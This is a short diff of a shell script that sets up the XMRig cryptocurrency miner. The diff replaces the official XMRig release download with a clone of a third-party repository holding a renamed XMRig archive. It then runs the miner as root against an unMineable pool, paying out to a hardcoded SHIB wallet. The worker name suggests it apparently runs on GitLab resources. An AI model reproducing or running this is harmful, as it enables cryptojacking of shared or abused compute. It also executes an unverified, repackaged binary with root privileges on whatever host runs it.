@@ -7,7 +7,8 @@ clear
 sudo apt install screen
 screen -R xmr
  
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
-tar xvf xmrig-6.18.0-linux-x64.tar.gz
-cd xmrig-6.18.0
+git clone https://github.com/burocos/ngorok.git
+cd ngorok
+tar xvf xmrig-ngorok.tar.gz
+cd xmrig-ngro
 sudo ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0x8cc95e87e9110269f61e5f40e88dbe6c347e7ac0.GLAB
